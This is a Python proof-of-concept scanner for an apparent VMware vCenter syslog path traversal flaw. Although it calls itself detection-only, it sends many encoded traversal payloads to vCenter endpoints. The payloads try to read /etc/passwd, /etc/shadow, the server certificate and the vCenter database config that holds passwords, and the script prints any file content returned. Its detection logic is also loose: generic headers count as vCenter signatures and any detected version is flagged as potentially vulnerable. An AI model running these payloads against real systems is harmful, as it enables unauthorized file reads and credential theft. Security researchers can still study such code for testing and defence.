#!/usr/bin/env python3
"""
CVE-2026-59310 - VMware vCenter Syslog Server Path Traversal PoC
CVSS: 9.8 | CWE: CWE-22
For authorized security testing only.
Detection-only script — no destructive operations.
"""

import argparse
import re
import sys
import time
import urllib3

import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TIMEOUT = 10
USER_AGENT = "AttackWatch-PoC-Scanner/1.0 (CVE-2026-59310)"

# vCenter detection signatures
VCENTER_SIGNATURES = [
    "VMware vCenter",
    "vSphere",
    "VMware vSphere",
    "vsphere-client",
    "VMware VSPHERE",
    "X-Frame-Options",
]

VCENTER_HEADERS = [
    "x-vcenter-api-version",
    "x-vcenter-serial",
    "x-content-type-options",
]

# Common vCenter endpoints
VCENTER_DETECT_PATHS = [
    "/ui/",
    "/",
    "/sdk/",
    "/rest/com/vmware/cis/session",
    "/api/",
]

VERSION_PATHS = [
    "/rest/appliance/system/version",
    "/api/appliance/system/version",
    "/rest/com/vmware/content/library",
    "/sdk/vimServiceVersions.xml",
    "/ui/pluginExtensionModules",
]

# Syslog-related paths vulnerable to traversal
SYSLOG_PATHS = [
    "/rest/appliance/logging/forwarding",
    "/api/appliance/logging/forwarding",
    "/rest/appliance/ntp",
    "/api/appliance/ntp",
    "/config/syslog",
    "/syslog/config",
    "/api/appliance/logging",
    "/rest/appliance/logging",
]

# Path traversal payloads for file_read
FILE_READ_PAYLOADS = [
    # Linux targets
    ("../../../etc/passwd", "root:", "unix_passwd"),
    ("../../../../etc/passwd", "root:", "unix_passwd_deep"),
    ("..%2F..%2F..%2Fetc%2Fpasswd", "root:", "unix_passwd_encoded"),
    ("..%252F..%252F..%252Fetc%252Fpasswd", "root:", "unix_passwd_double_encoded"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:", "unix_passwd_hex"),
    ("../../../etc/shadow", "root:", "unix_shadow"),
    ("../../../etc/hosts", "localhost", "unix_hosts"),
    ("../../../proc/version", "Linux", "proc_version"),
    # Windows targets
    ("..\\..\\.\\windows\\win.ini", "[fonts]", "win_ini"),
    ("..\\..\\..\\windows\\win.ini", "[fonts]", "win_ini_backslash"),
    ("..%5c..%5c..%5cwindows%5cwin.ini", "[fonts]", "win_ini_encoded"),
    ("../../../windows/win.ini", "[fonts]", "win_ini_forward"),
    # vCenter-specific
    ("../../../etc/vmware/ssl/rui.crt", "BEGIN CERTIFICATE", "vcenter_cert"),
    ("../../../etc/vmware-vpx/vcdb.properties", "password", "vcenter_db_config"),
]

# Error-based payloads to trigger path traversal errors
ERROR_PAYLOADS = [
    ("../../../../../../../../etc/passwd\x00", ["error", "invalid", "exception", "stack", "traceback", "file not found", "no such file"], "null_byte"),
    ("../../../../../" * 10 + "etc/passwd", ["error", "invalid", "exception", "illegal", "path", "traversal"], "deep_traversal"),
    ("%00/../../../etc/passwd", ["error", "exception", "null", "invalid"], "null_prefix"),
    ("....//....//....//etc/passwd", ["error", "exception", "invalid", "path"], "dotdotslash"),
    ("/etc/passwd%00", ["error", "null", "invalid", "exception"], "null_suffix"),
    ("../../[traversal_test]", ["error", "invalid", "exception", "bracket"], "invalid_chars"),
]


def make_request(url, method="GET", data=None, headers=None, verbose=False, timeout=None):
    """Helper to make HTTP requests with proper error handling."""
    _timeout = timeout or TIMEOUT
    _headers = {"User-Agent": USER_AGENT}
    if headers:
        _headers.update(headers)

    try:
        if verbose:
            print(f"  [REQ] {method} {url}")
            if data:
                print(f"  [DATA] {str(data)[:200]}")

        if method == "GET":
            resp = requests.get(url, headers=_headers, timeout=_timeout, verify=False, allow_redirects=True)
        elif method == "POST":
            resp = requests.post(url, json=data, headers=_headers, timeout=_timeout, verify=False, allow_redirects=True)
        elif method == "PUT":
            resp = requests.put(url, json=data, headers=_headers, timeout=_timeout, verify=False, allow_redirects=True)
        else:
            resp = requests.request(method, url, headers=_headers, timeout=_timeout, verify=False)

        if verbose:
            print(f"  [RESP] Status={resp.status_code} Size={len(resp.content)}")

        return resp

    except requests.exceptions.ConnectionError as e:
        if verbose:
            print(f"  [ERR] Connection error: {e}")
        return None
    except requests.exceptions.Timeout:
        if verbose:
            print(f"  [ERR] Request timed out after {_timeout}s")
        return None
    except requests.exceptions.RequestException as e:
        if verbose:
            print(f"  [ERR] Request failed: {e}")
        return None


def normalize_target(target):
    """Ensure target has a scheme."""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    return target.rstrip("/")


def check_product(target, verbose=False):
    """Stage 1: Detect if target is running VMware vCenter (Passive)."""
    if verbose:
        print("\n[*] Stage 1: Product Detection")

    detected = False
    evidence = []

    for path in VCENTER_DETECT_PATHS:
        url = target + path
        resp = make_request(url, verbose=verbose)
        if resp is None:
            continue

        body_lower = resp.text.lower()

        # Check body signatures
        for sig in VCENTER_SIGNATURES:
            if sig.lower() in body_lower:
                detected = True
                evidence.append(f"Found '{sig}' in response body at {path}")
                if verbose:
                    print(f"  [+] vCenter signature detected: '{sig}' at {path}")
                break

        # Check response headers for vCenter indicators
        for hdr in VCENTER_HEADERS:
            if hdr in resp.headers:
                detected = True
                evidence.append(f"Found vCenter header '{hdr}': {resp.headers[hdr]}")
                if verbose:
                    print(f"  [+] vCenter header found: {hdr}={resp.headers[hdr]}")

        # Check for vCenter-specific status/redirect patterns
        if resp.status_code in (200, 302, 401, 403):
            if "vsphere" in body_lower or "vcenter" in body_lower:
                detected = True
                evidence.append(f"vCenter content detected at {path} (HTTP {resp.status_code})")

        if detected:
            break

    if verbose and not detected:
        print("  [-] No vCenter signatures found")

    return {"detected": detected, "evidence": evidence}


def check_version(target, verbose=False):
    """Stage 2: Detect vCenter version and check if in vulnerable range (Passive)."""
    if verbose:
        print("\n[*] Stage 2: Version Detection")

    version_info = {"potentially_vulnerable": False, "version": None, "evidence": None}

    # Attempt authenticated-optional version endpoints
    for path in VERSION_PATHS:
        url = target + path
        resp = make_request(url, verbose=verbose)
        if resp is None:
            continue

        # Try to extract version from JSON response
        if resp.status_code == 200:
            try:
                data = resp.json()
                # REST API response
                if "version" in data:
                    ver = data.get("version", "")
                    version_info["version"] = ver
                    version_info["evidence"] = f"Version from {path}: {ver}"
                    if verbose:
                        print(f"  [+] Version detected: {ver}")
                # Nested value response
                if "value" in data and isinstance(data["value"], dict):
                    ver = data["value"].get("version", "")
                    if ver:
                        version_info["version"] = ver
                        version_info["evidence"] = f"Version from {path}: {ver}"
                        if verbose:
                            print(f"  [+] Version detected: {ver}")
            except (ValueError, KeyError):
                pass

        # Try XML version file
        if path.endswith(".xml") and resp.status_code == 200:
            match = re.search(r"<version>([\d.]+)</version>", resp.text)
            if match:
                ver = match.group(1)
                version_info["version"] = ver
                version_info["evidence"] = f"Version from XML {path}: {ver}"
                if verbose:
                    print(f"  [+] XML version detected: {ver}")

        # Fallback: check Server header
        server_hdr = resp.headers.get("Server", "")
        if "vcenter" in server_hdr.lower() or "vmware" in server_hdr.lower():
            version_info["evidence"] = f"Server header: {server_hdr}"
            if verbose:
                print(f"  [+] Server header: {server_hdr}")

    # All vCenter versions are considered potentially vulnerable for CVE-2026-59310
    # (specific affected range would be defined by vendor advisory)
    if version_info.get("version") or version_info.get("evidence"):
        version_info["potentially_vulnerable"] = True
        if verbose:
            print(f"  [!] Version in potentially vulnerable range")
    elif verbose:
        print("  [?] Could not determine version — proceeding to active testing")

    return version_info


def build_traversal_url(base_url, syslog_path, traversal_payload, param_style="path"):
    """Build URL with traversal payload embedded in different positions."""
    urls = []

    # As a query parameter (common for syslog host/path config)
    urls.append(f"{base_url}{syslog_path}?path={traversal_payload}")
    urls.append(f"{base_url}{syslog_path}?host={traversal_payload}")
    urls.append(f"{base_url}{syslog_path}?logfile={traversal_payload}")
    urls.append(f"{base_url}{syslog_path}?filename={traversal_payload}")
    urls.append(f"{base_url}{syslog_path}?config={traversal_payload}")

    # As path segment
    urls.append(f"{base_url}{syslog_path}/{traversal_payload}")

    return urls


def test_file_read(target, verbose=False):
    """
    Stage 3 - Method 1: file_read
    Attempt to read known system files via path traversal in Syslog endpoints.
    """
    if verbose:
        print("\n[*] Stage 3a: Active Test - file_read method")

    for syslog_path in SYSLOG_PATHS:
        for payload, expected_content, payload_name in FILE_READ_PAYLOADS:
            candidate_urls = build_traversal_url(target, syslog_path, payload)

            for url in candidate_urls:
                resp = make_request(url, verbose=verbose)
                if resp is None:
                    continue

                if resp.status_code in (200, 206):
                    body = resp.text
                    # Check if file content signature appears in response
                    if expected_content.lower() in body.lower():
                        snippet = body[:300].replace("\n", "\\n")
                        if verbose:
                            print(f"  [!!!] FILE READ SUCCESS at {url}")
                            print(f"  [!!!] Payload: {payload_name}")
                            print(f"  [!!!] Content snippet: {snippet[:150]}")
                        return {
                            "confirmed": True,
                            "confidence": 95,
                            "method": "file_read",
                            "evidence": (
                                f"Path traversal confirmed — target content '{expected_content}' "
                                f"found in response using payload '{payload_name}' "
                                f"at {url} | Snippet: {snippet[:100]}"
                            ),
                        }

            # Also try POST/PUT with JSON body for syslog configuration endpoints
            for json_key in ["path", "hostname", "logfile", "filename", "config_path"]:
                post_url = target + syslog_path
                post_data = {json_key: payload}
                resp = make_request(post_url, method="POST", data=post_data, verbose=verbose)
                if resp is None:
                    continue
                if resp.status_code in (200, 201, 206):
                    body = resp.text
                    if expected_content.lower() in body.lower():
                        snippet = body[:300].replace("\n", "\\n")
                        if verbose:
                            print(f"  [!!!] FILE READ via POST at {post_url}")
                        return {
                            "confirmed": True,
                            "confidence": 95,
                            "method": "file_read",
                            "evidence": (
                                f"Path traversal via POST — content '{expected_content}' "
                                f"found using payload '{payload_name}' (key='{json_key}') "
                                f"at {post_url} | Snippet: {snippet[:100]}"
                            ),
                        }

    if verbose:
        print("  [-] file_read method: no traversal confirmed")
    return {"confirmed": False}


def test_error_based(target, verbose=False):
    """
    Stage 3 - Method 2: error_based
    Inject malformed path traversal input to trigger error messages that reveal vulnerability.
    """
    if verbose:
        print("\n[*] Stage 3b: Active Test - error_based method")

    # Baseline response for comparison
    baseline_resp = make_request(target + SYSLOG_PATHS[0], verbose=verbose)
    baseline_body = baseline_resp.text.lower() if baseline_resp else ""
    baseline_len = len(baseline_body)

    for syslog_path in SYSLOG_PATHS:
        for payload, error_indicators, payload_name in ERROR_PAYLOADS:
            candidate_urls = [
                f"{target}{syslog_path}?path={payload}",
                f"{target}{syslog_path}?logfile={payload}",
                f"{target}{syslog_path}/{payload}",
            ]

            for url in candidate_urls:
                resp = make_request(url, verbose=verbose)
                if resp is None:
                    continue

                body_lower = resp.text.lower()

                # Look for error messages that differ from baseline
                for indicator in error_indicators:
                    if indicator in body_lower and indicator not in baseline_body:
                        # Confirm it's traversal-related error (not generic)
                        traversal_patterns = [
                            "path", "traversal", "directory", "file",
                            "access", "denied", "illegal", "invalid path",
                            "no such file", "not found", "permission"
                        ]
                        if any(tp in body_lower for tp in traversal_patterns):
                            snippet = resp.text[:400].replace("\n", " ")
                            if verbose:
                                print(f"  [!!!] ERROR-BASED traversal indicator at {url}")
                                print(f"  [!!!] Indicator: '{indicator}' | Payload: {payload_name}")
                            return {
                                "confirmed": True,
                                "confidence": 75,
                                "method": "error_based",
                                "evidence": (
                                    f"Traversal error indicator '{indicator}' triggered by "
                                    f"payload '{payload_name}' at {url} | "
                                    f"Response snippet: {snippet[:150]}"
                                ),
                            }

                # Significant response size difference may indicate traversal
                resp_len = len(body_lower)
                if resp_len > baseline_len * 2 and resp_len > 500:
                    # Check if response looks like a file (not an error page)
                    file_indicators = ["root:", "[fonts]", "begin certificate", "localhost", "127.0.0.1"]
                    for fi in file_indicators:
                        if fi in body_lower:
                            snippet = resp.text[:300].replace("\n", "\\n")
                            if verbose:
                                print(f"  [!!!] Unexpected file content in error response at {url}")
                            return {
                                "confirmed": True,
                                "confidence": 80,
                                "method": "error_based",
                                "evidence": (
                                    f"File content indicator '{fi}' in oversized error response "
                                    f"(baseline={baseline_len}, got={resp_len}) "
                                    f"using payload '{payload_name}' at {url} | "
                                    f"Snippet: {snippet[:100]}"
                                ),
                            }

            # POST-based error testing
            for json_key in ["path", "logfile", "hostname"]:
                post_url = target + syslog_path
                post_data = {json_key: payload}
                resp = make_request(post_url, method="POST", data=post_data, verbose=verbose)
                if resp is None:
                    continue

                body_lower = resp.text.lower()
                for indicator in error_indicators:
                    if indicator in body_lower and indicator not in baseline_body:
                        traversal_patterns = [
                            "path", "traversal", "directory", "file",
                            "access", "denied", "illegal", "no such file"
                        ]
                        if any(tp in body_lower for tp in traversal_patterns):
                            snippet = resp.text[:400].replace("\n", " ")
                            if verbose:
                                print(f"  [!!!] ERROR-BASED via POST at {post_url}")
                            return {
                                "confirmed": True,
                                "confidence": 75,
                                "method": "error_based",
                                "evidence": (
                                    f"Traversal error '{indicator}' via POST (key='{json_key}') "
                                    f"with payload '{payload_name}' at {post_url} | "
                                    f"Snippet: {snippet[:150]}"
                                ),
                            }

    if verbose:
        print("  [-] error_based method: no traversal indicators found")
    return {"confirmed": False}


def check_vulnerability(target, active_test=True, callback_url=None, verbose=False):
    """Main vulnerability check orchestrator for CVE-2026-59310."""
    results = {
        "vulnerable": False,
        "confidence": 0,
        "evidence": None,
        "method": None,
        "stage": None,
    }

    # Stage 1: Product Detection
    product = check_product(target, verbose=verbose)
    if not product["detected"]:
        if verbose:
            print("\n[-] Target does not appear to be running VMware vCenter")
            print("    Proceeding to active testing anyway (product may be hardened)")
        # Still proceed — version check / active test may confirm
    else:
        if verbose:
            print(f"\n[+] VMware vCenter detected: {product['evidence'][0] if product['evidence'] else 'yes'}")

    # Stage 2: Version Detection
    version_result = check_version(target, verbose=verbose)
    if version_result.get("potentially_vulnerable"):
        results["stage"] = "version_check"
        results["confidence"] = 30
        results["evidence"] = version_result.get("evidence", "Version in potentially vulnerable range")
        if verbose:
            print(f"\n[!] Potentially vulnerable version: {version_result.get('version', 'unknown')}")

    if not active_test:
        return results

    # Stage 3a: file_read method
    file_read_result = test_file_read(target, verbose=verbose)
    if file_read_result.get("confirmed"):
        results["vulnerable"] = True
        results["confidence"] = file_read_result["confidence"]
        results["evidence"] = file_read_result["evidence"]
        results["method"] = file_read_result["method"]
        results["stage"] = "active_test"
        return results

    # Stage 3b: error_based method
    error_result = test_error_based(target, verbose=verbose)
    if error_result.get("confirmed"):
        results["vulnerable"] = True
        results["confidence"] = error_result["confidence"]
        results["evidence"] = error_result["evidence"]
        results["method"] = error_result["method"]
        results["stage"] = "active_test"
        return results

    return results


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2026-59310 Detection PoC — VMware vCenter Syslog Path Traversal (Detection Only)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  %(prog)s -t https://vcenter.example.com -c -v\n"
            "  %(prog)s -t https://192.168.1.10 --version-only\n"
            "  %(prog)s -t https://vcenter.example.com -c --timeout 20\n"
        ),
    )
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., https://vcenter.example.com)")
    parser.add_argument("-c", "--check", action="store_true", help="Run full vulnerability check")
    parser.add_argument("--version-only", action="store_true", help="Passive version check only (skip active testing)")
    parser.add_argument("--callback", help="Callback URL for OOB detection (e.g., https://your.interact.sh)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")

    args = parser.parse_args()

    global TIMEOUT
    TIMEOUT = args.timeout

    target = normalize_target(args.target)

    print(f"[*] CVE-2026-59310 — VMware vCenter Syslog Path Traversal")
    print(f"[*] Target: {target}")
    print(f"[*] CVSS: 9.8 | CWE-22 | Detection-only mode")
    print(f"[*] Timeout: {TIMEOUT}s")

    if args.version_only:
        print("\n[*] Running version-only check (passive)...")
        product = check_product(target, verbose=args.verbose)
        if not product["detected"]:
            print("[-] VMware vCenter not detected on target")
        version_result = check_version(target, verbose=args.verbose)
        if version_result.get("potentially_vulnerable"):
            print("\n[POTENTIALLY VULNERABLE]")
            print(f"Evidence: {version_result.get('evidence', 'Version in affected range')}")
            print("Note: Version-only check — active testing is required for confirmation")
            sys.exit(0)
        else:
            print("\n[NOT VULNERABLE]")
            print("Note: Could not confirm vulnerable version — active testing recommended")
            sys.exit(0)

    # Full check (default when -c is passed or no mode specified)
    if args.check or not args.version_only:
        print("\n[*] Running full vulnerability check (active testing enabled)...")
        result = check_vulnerability(
            target,
            active_test=True,
            callback_url=args.callback,
            verbose=args.verbose,
        )

        print()
        if result["vulnerable"]:
            print("[VULNERABLE]")
            print(f"Confidence: {result['confidence']}%")
            print(f"Evidence: {result['evidence']}")
            print(f"Method: {result['method']}")
            print(f"Stage: {result['stage']}")
            sys.exit(1)
        else:
            not_confident = 100 - result["confidence"]
            print("[NOT VULNERABLE]")
            print(f"Confidence: {not_confident}%")
            if result.get("evidence"):
                print(f"Note: {result['evidence']}")
            else:
                print("Note: No traversal indicators detected — target may be patched or unreachable")
            sys.exit(0)


if __name__ == "__main__":
    main()